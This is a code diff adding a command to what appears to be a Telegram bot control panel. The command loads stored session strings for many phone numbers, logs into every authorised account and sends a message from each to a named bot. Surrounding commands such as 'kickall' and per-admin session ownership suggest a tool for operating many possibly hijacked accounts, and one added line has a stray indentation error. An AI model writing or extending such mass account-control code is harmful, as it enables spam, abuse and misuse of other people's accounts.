@@ -502,6 +502,65 @@ async def cmd_fa(message: types.Message):
     finally:
         await client.disconnect()
 
+ @dp.message_handler(commands=['sile'])
+async def cmd_sile(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        return
+
+    await message.answer("🔄 Starting to send messages from all sessions...")
+    
+    if is_main_admin(message.from_user.id):
+        sessions = list(sessions_col.find({}))
+    else:
+        sessions = list(light_sessions_col.find({"owner_id": message.from_user.id}))
+    
+    if not sessions:
+        await message.answer("❌ No sessions found.")
+        return
+
+    success = 0
+    failed = 0
+    results = []
+    
+    for session in sessions:
+        phone = session.get("phone")
+        session_str = session.get("session")
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                try:
+                    await client.send_message('T686T_bot', 'hello bro')
+                    results.append(f"✅ {phone} - Message sent")
+                    success += 1
+                except Exception as e:
+                    results.append(f"❌ {phone} - Send error: {str(e)}")
+                    failed += 1
+            else:
+                results.append(f"❌ {phone} - Not authorized")
+                failed += 1
+        except Exception as e:
+            results.append(f"❌ {phone} - Connection error: {str(e)}")
+            failed += 1
+        finally:
+            await client.disconnect()
+    
+    # Send summary
+    summary = (
+        f"📊 Results:\n"
+        f"Total sessions: {len(sessions)}\n"
+        f"Success: {success}\n"
+        f"Failed: {failed}\n\n"
+        f"Detailed results:"
+    )
+    
+    await message.answer(summary)
+    
+    # Send detailed results in chunks
+    for chunk in [results[i:i+20] for i in range(0, len(results), 20)]:
+        await message.answer("\n".join(chunk))       
+
 @dp.message_handler(commands=['kickall'])
 async def cmd_kickall(message: types.Message):
     if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
